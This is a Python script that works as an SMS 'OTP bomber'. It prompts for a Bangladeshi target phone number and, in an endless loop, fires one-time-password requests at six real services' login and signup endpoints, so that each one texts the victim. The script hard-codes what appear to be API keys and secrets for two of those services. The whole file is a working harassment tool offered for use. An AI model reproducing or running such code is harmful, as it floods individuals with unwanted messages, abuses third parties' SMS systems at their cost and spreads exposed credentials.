import requests as rq
from requests.structures import CaseInsensitiveDict

number=str(input("[!] Enter Target Number: +88"))


def toffee():
    url = "https://toffeelive.com/app/service.php"
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    data = "phoneNumber="+number+"&route=auth_verify_mobile_no"
    resp = rq.post(url, headers=headers, data=data)
    if resp.status_code==200:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    elif resp.status_code==201:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    else:
        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")

def daktarbhai():
    url = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
    resp = rq.post(url)
    if resp.status_code==200:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    elif resp.status_code==201:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    else:
        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")

def quizgiri():
    data = {"phone":"+88"+number, "fcm_token":"null"}
    url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
    resp = rq.post(url, json=data)
    if resp.status_code==200:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    elif resp.status_code==201:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    else:
        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")

def bioscope():
    url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
    resp = rq.post(url)
    if resp.status_code==200:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    elif resp.status_code==201:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    else:
        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")

def hoichoi():
    header = {"x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"}
    data = {"requestType":"send", "phoneNumber":"+88"+number, "screenName":"signin"}
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
    resp = rq.post(url, json=data, headers=header)
    if resp.status_code==200:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    elif resp.status_code==201:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    else:
        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")

def yandex():
    data = {"phone_number":"+88"+number}
    url = "https://eda.yandex/api/v1/user/request_authentication_code"
    resp = rq.post(url, json=data)
    if resp.status_code==200:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    elif resp.status_code==201:
        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
    else:
        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")


while True:
    toffee()
    daktarbhai()
    quizgiri()
    bioscope()
    hoichoi()
    yandex()



